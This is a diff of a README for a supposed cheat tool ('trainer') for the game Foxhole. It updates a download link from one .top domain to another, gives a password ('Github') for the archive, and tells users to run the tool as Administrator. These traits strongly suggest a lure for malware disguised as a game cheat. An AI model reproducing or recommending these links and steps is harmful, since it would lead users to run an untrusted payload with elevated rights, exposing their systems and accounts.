@@ -6,7 +6,7 @@ Foxhole trainer with god mode, unlimited stamina, resource spawn, fast logistics
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on popular mods like **FoxholeCheat**, **WarTrainer**, and **ColonialMenu*
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Foxhole.
 4. Run the trainer **as Administrator**.
